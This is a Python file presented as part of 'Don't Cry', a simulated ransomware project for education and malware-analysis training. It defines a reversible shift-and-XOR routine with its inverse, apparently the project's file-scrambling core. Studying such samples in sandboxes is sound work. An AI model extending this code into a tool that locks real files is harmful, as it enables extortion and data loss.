################################################################################
#                             Don't Cry Ransomware                             #
#                          ! EDUCATIONAL PURPOSES ONLY !                       #
################################################################################
# DISCLAIMER: This is a simulated ransomware (DCry), written for cybersecurity
# research, ethical hacking education, and malware analysis training only.
# It mimics behavior of real ransomware but must NOT be used for illegal or
# unauthorized activity. Run only in isolated environments (e.g., sandbox or VM)
# under supervision of cybersecurity professionals.
# The authors assume no liability for any misuse or damage caused.

OUTER_XOR_KEY = 42
MIN_ASCII = 32
MAX_ASCII = 126

def calculate_shift(index):
    shift_val = index * 7 + (index // 3) + (index % 11) + ((index >> 2) & 0x7)
    temp_shift = shift_val + (index % 5)
    return (temp_shift % (MAX_ASCII - MIN_ASCII + 1)) + 1  # phù hợp mọi ký tự in được

def ex42(text: bytes) -> bytes:
    output = bytearray(len(text))
    for i, byte in enumerate(text):
        if MIN_ASCII <= byte <= MAX_ASCII:
            shift = calculate_shift(i)
            rel = byte - MIN_ASCII
            shifted = (rel + shift) % (MAX_ASCII - MIN_ASCII + 1)
            final_byte = (shifted + MIN_ASCII) ^ OUTER_XOR_KEY
        else:
            final_byte = byte ^ OUTER_XOR_KEY  # vẫn mã hóa, nhưng không shift
        output[i] = final_byte
    return bytes(output)

def dx42(data: bytes) -> bytes:
    output = bytearray(len(data))
    for i, byte in enumerate(data):
        pre_xor = byte ^ OUTER_XOR_KEY
        if MIN_ASCII <= pre_xor <= MAX_ASCII:
            shift = calculate_shift(i)
            rel = pre_xor - MIN_ASCII
            unshifted = (rel - shift + (MAX_ASCII - MIN_ASCII + 1)) % (MAX_ASCII - MIN_ASCII + 1)
            final_byte = unshifted + MIN_ASCII
        else:
            final_byte = pre_xor
        output[i] = final_byte
    return bytes(output)

